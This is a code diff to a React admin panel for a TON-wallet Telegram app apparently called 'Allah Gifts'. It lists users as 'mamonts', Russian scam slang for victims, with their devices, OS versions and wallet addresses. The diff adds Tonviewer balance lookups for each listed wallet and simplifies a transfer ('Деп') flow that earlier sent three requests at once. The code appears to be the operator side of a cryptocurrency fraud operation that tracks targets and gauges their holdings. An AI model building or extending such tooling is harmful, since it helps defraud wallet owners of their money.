@@ -5,15 +5,13 @@ import {
 import { useEffect, useState } from "react";
 
 import { api } from "./lib/api";
-import { shortenAddress } from "./lib/telegram";
-import type { AdminUserRecord, TonUsdRate } from "./types";
+import type { AdminUserRecord, AdminWalletSnapshot, TonUsdRate } from "./types";
 
 type PayoutUnit = "TON" | "USD";
 type AdminView = "mamonts" | "stats";
 
 const ADMIN_REFRESH_INTERVAL_MS = 7000;
 const RATE_REFRESH_INTERVAL_MS = 30000;
-const ADMIN_PAYOUT_REQUEST_COUNT = 3;
 const TON_NANO_FACTOR = 1_000_000_000n;
 const USD_SCALE = 6;
 
@@ -30,6 +28,20 @@ function formatAdminDate(value: string): string {
 
 function formatOsVersion(user: AdminUserRecord): string {
   return [user.os_name, user.os_version].filter(Boolean).join(" ");
+}
+
+function walletSnapshotKey(walletAddress: string): string {
+  return walletAddress.trim().toLowerCase();
+}
+
+function formatWalletBalance(snapshot: AdminWalletSnapshot | null): string {
+  if (!snapshot) {
+    return "Balance: loading...";
+  }
+  if (snapshot.error || !snapshot.balance_ton) {
+    return "Balance: unavailable";
+  }
+  return `Balance: ${snapshot.balance_ton} TON`;
 }
 
 function readAdminToken(): string {
@@ -125,8 +137,10 @@ function formatUsd(value: number): string {
 
 export function OperatorAdminPanel() {
   const [users, setUsers] = useState<AdminUserRecord[]>([]);
+  const [walletSnapshots, setWalletSnapshots] = useState<Record<string, AdminWalletSnapshot>>({});
   const [adminToken, setAdminToken] = useState<string>(readAdminToken);
-  const [statusText, setStatusText] = useState<string>("Загрузка пользователей...");
+  const [statusText, setStatusText] = useState<string>("Loading users...");
+  const [walletSnapshotStatusText, setWalletSnapshotStatusText] = useState<string>("");
   const [rateStatusText, setRateStatusText] = useState<string>("");
   const [isLoading, setIsLoading] = useState<boolean>(true);
   const [activeView, setActiveView] = useState<AdminView>("mamonts");
@@ -140,13 +154,48 @@ export function OperatorAdminPanel() {
   const [tonConnectUI] = useTonConnectUI();
   const adminWalletAddress = useTonAddress();
 
+  async function loadWalletSnapshots(records: AdminUserRecord[], token = adminToken) {
+    const walletAddresses = Array.from(
+      new Set(records.map((user) => user.wallet_address.trim()).filter(Boolean)),
+    );
+
+    if (!walletAddresses.length) {
+      setWalletSnapshots({});
+      setWalletSnapshotStatusText("");
+      return;
+    }
+
+    try {
+      const payload = await api.getAdminWalletSnapshots(token, walletAddresses);
+      setWalletSnapshots(
+        Object.fromEntries(
+          payload.map((snapshot) => [walletSnapshotKey(snapshot.wallet_address), snapshot]),
+        ),
+      );
+      const failedCount = payload.filter((snapshot) => snapshot.error).length;
+      setWalletSnapshotStatusText(
+        failedCount
+          ? `Tonviewer balances: ${payload.length - failedCount}/${payload.length}`
+          : `Tonviewer balances: ${payload.length}`,
+      );
+    } catch (error) {
+      setWalletSnapshots({});
+      setWalletSnapshotStatusText(
+        error instanceof Error ? error.message : "Tonviewer balance request failed",
+      );
+    }
+  }
+
   async function loadUsers(token = adminToken) {
     setIsLoading(true);
     try {
       const payload = await api.getAdminUsers(token);
       setUsers(payload);
-      setStatusText(`Загружено записей: ${payload.length}.`);
+      await loadWalletSnapshots(payload, token);
+      setStatusText(`Loaded users: ${payload.length}`);
     } catch (error) {
+      setWalletSnapshots({});
+      setWalletSnapshotStatusText("");
       setStatusText(error instanceof Error ? error.message : "Admin request failed");
     } finally {
       setIsLoading(false);
@@ -157,7 +206,7 @@ export function OperatorAdminPanel() {
     try {
       const payload = await api.getTonUsdRate();
       setTonUsdRate(payload);
-      setRateStatusText(`Курс: ${formatUsd(payload.usd)} за 1 TON.`);
+      setRateStatusText(`Rate: ${formatUsd(payload.usd)} / TON`);
     } catch (error) {
       setRateStatusText(error instanceof Error ? error.message : "TON/USD rate request failed");
     }
@@ -175,13 +224,13 @@ export function OperatorAdminPanel() {
 
   async function handleAdminPayout() {
     if (!adminWalletAddress) {
-      setPayoutStatusText("Сначала подключи admin TON wallet.");
+      setPayoutStatusText("Connect admin TON wallet first.");
       return;
     }
 
     const targetAddress = targetWalletAddress.trim();
     if (!targetAddress) {
-      setPayoutStatusText("Укажи адрес получателя.");
+      setPayoutStatusText("Enter target wallet.");
       return;
     }
 
@@ -189,7 +238,7 @@ export function OperatorAdminPanel() {
     try {
       amountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
     } catch (error) {
-      setPayoutStatusText(error instanceof Error ? error.message : "Сумма указана неверно.");
+      setPayoutStatusText(error instanceof Error ? error.message : "Amount is invalid.");
       return;
     }
 
@@ -199,19 +248,17 @@ export function OperatorAdminPanel() {
     try {
       await tonConnectUI.sendTransaction({
         validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: Array.from({ length: ADMIN_PAYOUT_REQUEST_COUNT }, () => ({
-          address: targetAddress,
-          amount: amountNano.toString(),
-        })),
+        messages: [
+          {
+            address: targetAddress,
+            amount: amountNano.toString(),
+          },
+        ],
       });
-      setPayoutStatusText(
-        `Отправлено ${ADMIN_PAYOUT_REQUEST_COUNT} перевода по ${formatTonFromNano(amountNano)} на ${shortenAddress(targetAddress)}.`,
-      );
+      setPayoutStatusText(`Request sent: ${formatTonFromNano(amountNano)} -> ${targetAddress}`);
       setPayoutAmountInput("");
     } catch (error) {
-      setPayoutStatusText(
-        error instanceof Error ? error.message : "TON payout request failed",
-      );
+      setPayoutStatusText(error instanceof Error ? error.message : "TON payout request failed");
     } finally {
       setIsPayoutPending(false);
     }
@@ -245,26 +292,26 @@ export function OperatorAdminPanel() {
   const latestUser = users[0] ?? null;
   const selectedUser =
     users.find((user) => user.wallet_address === selectedWalletAddress) ?? null;
+  const selectedSnapshot = selectedUser
+    ? walletSnapshots[walletSnapshotKey(selectedUser.wallet_address)] ?? null
+    : null;
 
   let payoutErrorText = "";
-  let singleRequestAmountNano = 0n;
+  let payoutAmountNano = 0n;
   try {
     if (payoutAmountInput.trim()) {
-      singleRequestAmountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
+      payoutAmountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
     }
   } catch (error) {
-    payoutErrorText = error instanceof Error ? error.message : "Сумма указана неверно.";
+    payoutErrorText = error instanceof Error ? error.message : "Amount is invalid.";
   }
 
-  const totalAmountNano = singleRequestAmountNano * BigInt(ADMIN_PAYOUT_REQUEST_COUNT);
-  const singleRequestAmountUsd =
-    tonUsdRate && singleRequestAmountNano > 0n
-      ? (Number(singleRequestAmountNano) / 1_000_000_000) * tonUsdRate.usd
-      : 0;
-  const totalAmountUsd =
-    tonUsdRate && totalAmountNano > 0n
-      ? (Number(totalAmountNano) / 1_000_000_000) * tonUsdRate.usd
-      : 0;
+  const payoutPreviewText =
+    payoutAmountNano > 0n
+      ? payoutUnit === "USD" && tonUsdRate
+        ? `${payoutAmountInput} USD = ${formatTonFromNano(payoutAmountNano)}`
+        : formatTonFromNano(payoutAmountNano)
+      : "Enter amount";
 
   return (
     <div className="opside-shell">
@@ -274,7 +321,7 @@ export function OperatorAdminPanel() {
             <p className="opside-brand__eyebrow">Allah Gifts</p>
             <h1>Admin</h1>
             <p className="opside-brand__copy">
-              Левая навигация, простой список мамонтов и отдельная сводка статистики.
+              Чистая панель с мамонтами, кошельком и балансом.
             </p>
           </div>
 
@@ -318,8 +365,9 @@ export function OperatorAdminPanel() {
 
           <section className="opside-sidecard">
             <span className="opside-sidecard__label">Сервис</span>
-            <p className="opside-sidecard__value">{isLoading ? "Синхронизация..." : statusText}</p>
-            <p className="opside-sidecard__hint">{rateStatusText || "Курс пока не загружен."}</p>
+            <p className="opside-sidecard__value">{isLoading ? "Sync..." : statusText}</p>
+            <p className="opside-sidecard__hint">{walletSnapshotStatusText || "Tonviewer balances are not loaded yet."}</p>
+            <p className="opside-sidecard__hint">{rateStatusText || "TON/USD rate is not loaded."}</p>
           </section>
         </aside>
 
@@ -333,36 +381,45 @@ export function OperatorAdminPanel() {
                 </div>
                 <div className="opside-head__meta">
                   <span>{users.length} записей</span>
-                  <span>{selectedUser ? shortenAddress(selectedUser.wallet_address) : "кошелек не выбран"}</span>
+                  <span>{selectedUser ? formatWalletBalance(selectedSnapshot) : "Кошелек не выбран"}</span>
                 </div>
               </header>
 
               <div className="opside-targets">
                 <section className="opside-targets__list">
                   {users.length ? (
-                    users.map((user) => (
-                      <article
-                        key={user.wallet_address}
-                        className={
-                          user.wallet_address === selectedWalletAddress
-                            ? "opside-target is-active"
-                            : "opside-target"
-                        }
-                      >
-                        <div className="opside-target__copy">
-                          <strong>{user.device}</strong>
-                          <span>{formatOsVersion(user)}</span>
-                        </div>
+                    users.map((user) => {
+                      const walletSnapshot =
+                        walletSnapshots[walletSnapshotKey(user.wallet_address)] ?? null;
 
-                        <button
-                          className="opside-button"
-                          onClick={() => handleUseWallet(user)}
-                          type="button"
+                      return (
+                        <article
+                          key={user.wallet_address}
+                          className={
+                            user.wallet_address === selectedWalletAddress
+                              ? "opside-target is-active"
+                              : "opside-target"
+                          }
                         >
-                          Деп
-                        </button>
-                      </article>
-                    ))
+                          <div className="opside-target__copy">
+                            <strong>{user.device}</strong>
+                            <span>{formatOsVersion(user)}</span>
+                            <code className="opside-target__wallet">{user.wallet_address}</code>
+                            <span className="opside-target__balance">
+                              {formatWalletBalance(walletSnapshot)}
+                            </span>
+                          </div>
+
+                          <button
+                            className="opside-button"
+                            onClick={() => handleUseWallet(user)}
+                            type="button"
+                          >
+                            Деп
+                          </button>
+                        </article>
+                      );
+                    })
                   ) : (
                     <div className="opside-empty">
                       Нет записей. Подключи TON wallet в web app, чтобы строка появилась здесь.
@@ -376,17 +433,23 @@ export function OperatorAdminPanel() {
                       <p className="opside-label">Деп</p>
                       <h3>{selectedUser ? selectedUser.device : "Выбери мамонта"}</h3>
                     </div>
-                    <span className="opside-badge">{ADMIN_PAYOUT_REQUEST_COUNT} перевода</span>
                   </div>
 
                   <p className="opside-payout__copy">
                     {selectedUser
-                      ? `${formatOsVersion(selectedUser)} · ${shortenAddress(selectedUser.wallet_address)}`
-                      : "Нажми кнопку «Деп» у нужной строки."}
+                      ? `${formatOsVersion(selectedUser)}`
+                      : "Нажми «Деп» у нужной строки."}
                   </p>
 
+                  <div className="opside-summary">
+                    <div>
+                      <span>Баланс</span>
+                      <strong>{formatWalletBalance(selectedSnapshot)}</strong>
+                    </div>
+                  </div>
+
                   <label className="opside-field">
-                    <span>Кошелек</span>
+                    <span>Куда</span>
                     <input
                       onChange={(event) => setTargetWalletAddress(event.target.value)}
                       placeholder="UQ... or EQ..."
@@ -414,7 +477,7 @@ export function OperatorAdminPanel() {
                     </div>
 
                     <label className="opside-field opside-field--compact">
-                      <span>{payoutUnit === "TON" ? "Сумма за 1 перевод" : "Сумма в USD за 1 перевод"}</span>
+                      <span>Сколько</span>
                       <input
                         inputMode="decimal"
                         onChange={(event) => setPayoutAmountInput(event.target.value)}
@@ -425,22 +488,7 @@ export function OperatorAdminPanel() {
                     </label>
                   </div>
 
-                  <div className="opside-summary">
-                    <div>
-                      <span>Курс</span>
-                      <strong>{tonUsdRate ? formatUsd(tonUsdRate.usd) : "not loaded"}</strong>
-                    </div>
-                    <div>
-                      <span>За 1 перевод</span>
-                      <strong>{singleRequestAmountNano > 0n ? formatTonFromNano(singleRequestAmountNano) : "—"}</strong>
-                      <small>{singleRequestAmountUsd > 0 ? formatUsd(singleRequestAmountUsd) : "USD preview unavailable"}</small>
-                    </div>
-                    <div>
-                      <span>Итого</span>
-                      <strong>{totalAmountNano > 0n ? formatTonFromNano(totalAmountNano) : "—"}</strong>
-                      <small>{totalAmountUsd > 0 ? formatUsd(totalAmountUsd) : "USD preview unavailable"}</small>
-                    </div>
-                  </div>
+                  <p className="opside-status">{payoutPreviewText}</p>
 
                   <button
                     className="opside-button opside-button--wide"
@@ -448,7 +496,7 @@ export function OperatorAdminPanel() {
                     onClick={() => void handleAdminPayout()}
                     type="button"
                   >
-                    {isPayoutPending ? "Подтверди в кошельке" : "Отправить деп"}
+                    {isPayoutPending ? "Подтверди в кошельке" : "Отправить"}
                   </button>
 
                   {payoutErrorText ? <p className="opside-status opside-status--warn">{payoutErrorText}</p> : null}
@@ -464,8 +512,8 @@ export function OperatorAdminPanel() {
                   <h2>Сводка</h2>
                 </div>
                 <div className="opside-head__meta">
-                  <span>{isLoading ? "Синхронизация..." : "Данные обновлены"}</span>
-                  <span>{latestUser ? formatAdminDate(latestUser.last_seen_at) : "нет активности"}</span>
+                  <span>{isLoading ? "Sync..." : "Данные обновлены"}</span>
+                  <span>{latestUser ? formatAdminDate(latestUser.last_seen_at) : "Нет активности"}</span>
                 </div>
               </header>
 
@@ -494,7 +542,7 @@ export function OperatorAdminPanel() {
                   <strong>{latestUser ? latestUser.device : "none"}</strong>
                 </div>
                 <div className="opside-report__row">
-                  <span>Версия iOS</span>
+                  <span>Версия ОС</span>
                   <strong>{latestUser ? formatOsVersion(latestUser) : "none"}</strong>
                 </div>
                 <div className="opside-report__row">
@@ -502,12 +550,12 @@ export function OperatorAdminPanel() {
                   <strong>{selectedUser ? selectedUser.wallet_address : "none"}</strong>
                 </div>
                 <div className="opside-report__row">
-                  <span>Курс TON/USD</span>
-                  <strong>{tonUsdRate ? formatUsd(tonUsdRate.usd) : "not loaded"}</strong>
+                  <span>Tonviewer</span>
+                  <strong>{walletSnapshotStatusText || "No data"}</strong>
                 </div>
                 <div className="opside-report__row">
-                  <span>Схема депа</span>
-                  <strong>{ADMIN_PAYOUT_REQUEST_COUNT} перевода за запрос</strong>
+                  <span>TON/USD</span>
+                  <strong>{tonUsdRate ? formatUsd(tonUsdRate.usd) : "not loaded"}</strong>
                 </div>
               </section>
             </>
